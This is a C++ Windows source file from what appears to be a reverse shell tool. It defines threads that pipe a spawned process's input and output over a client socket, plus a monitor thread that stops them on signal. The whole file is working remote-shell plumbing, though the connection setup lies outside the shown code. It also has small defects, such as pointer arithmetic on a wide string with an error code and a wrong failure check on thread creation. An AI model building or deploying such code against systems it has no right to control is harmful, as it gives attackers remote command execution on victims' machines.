#include <reverseShell.h>
#include <iostream>

extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;

static void notifyStopSignal(void) {
	InterlockedExchange(&g_stopRoutines, TRUE);
}

static BOOL routineShouldStop(void) {
	return (g_stopRoutines != 0);
}

BOOL processShouldStop(void) {
	if (shell.stopEventsignal != INVALID_HANDLE_VALUE) {
		if (WaitForSingleObject(shell.stopEventsignal, 0) == WAIT_OBJECT_0) {
			journalReport(L"Stop event signal reveived\n");
			return (TRUE);
		}
	}
	return (FALSE);
}

DWORD WINAPI sender(LPVOID) {
	char buffer[BUFFER_SIZE] = {};
	DWORD bytes = 0;

	while (true) {

		if (!ReadFile(shell.parentRead, buffer, BUFFER_SIZE-1, &bytes, NULL)) {
			journalReport(L"Failed to read pipe sender thread\n");
			notifyStopSignal();
			return (CONTINUE);
		} else {
			buffer[bytes] = '\0';
			int clientSentBytes = send(shell.clientSocket, buffer, (int)bytes, NULL);
			if (clientSentBytes == SOCKET_ERROR) {
				journalReport(L"Failed to send socket sender thread\n");
				notifyStopSignal();
				return (CONTINUE);
			}
		}
		ZeroMemory(buffer, BUFFER_SIZE);
		bytes = 0;
	}
	return (SUCCESS);
}

DWORD WINAPI listener(LPVOID) {
	char buffer[BUFFER_SIZE] = {};
	DWORD bytes = 0;

	while (true) {
		int clientRecvBytes = recv(shell.clientSocket, buffer, BUFFER_SIZE-1, NULL);
		if (clientRecvBytes == -1) {
			journalReport(L"client received bytes == -1 listener thread error code: " + GetLastError());
			notifyStopSignal();
			return (FAILURE);
		}
		if (clientRecvBytes == 0) {
			journalReport(L"Client sent EOF listener thread\n");
			notifyStopSignal();
			return (CONTINUE); // End of connection
		} else {
			buffer[clientRecvBytes] = '\0';
			if (!WriteFile(shell.parentWrite, buffer, (DWORD)clientRecvBytes, &bytes, NULL)) {
				journalReport(L"Failed to write listener thread\n");
				notifyStopSignal();
				return (CONTINUE);
			}
		}
		ZeroMemory(buffer, BUFFER_SIZE);
		bytes = 0;
	}
	return (SUCCESS);
}

DWORD WINAPI threadsHandler(LPVOID) {
	while (true) {
		Sleep(1000);
		if (routineShouldStop() == TRUE) {
			journalReport(L"routine should stop received\n");
			cleanUp(L"Thread handler routine\n");
			break ;
		}
		if (processShouldStop() == TRUE) {
			journalReport(L"process should stop received\n");
			g_stopProcess = TRUE;
			cleanUp(L"Thread handled process\n");
			break ;
		}
	}
	return (SUCCESS);
}

static void createThread(LPTHREAD_START_ROUTINE routineFuncAddr, PHANDLE threadHandle) {
	*threadHandle = CreateThread(
		NULL, 0,
		routineFuncAddr,
		NULL, 0, NULL
	);
}

BYTE launchThreadsMonitor(void) {
	createThread(threadsHandler, &shell.threadsHandler);
	if (shell.threadsHandler == INVALID_HANDLE_VALUE)
		return (FAILURE);
	return (SUCCESS);
}

BYTE startRoutines(void) {

	createThread(listener, &shell.threadListener);
	if (shell.threadListener == INVALID_HANDLE_VALUE)
		return (FAILURE);

	createThread(sender, &shell.threadSender);
	if (shell.threadSender == INVALID_HANDLE_VALUE)
		return (FAILURE);

	journalReport(L"Routines launched");
	HANDLE threads[] = { shell.threadsHandler, shell.threadListener, shell.threadSender };
	if (WaitForMultipleObjects(3, threads, TRUE, INFINITE) == WAIT_OBJECT_0) {
		g_stopRoutines = 0;
		journalReport(L"Threads done");
	}
	return (SUCCESS);
}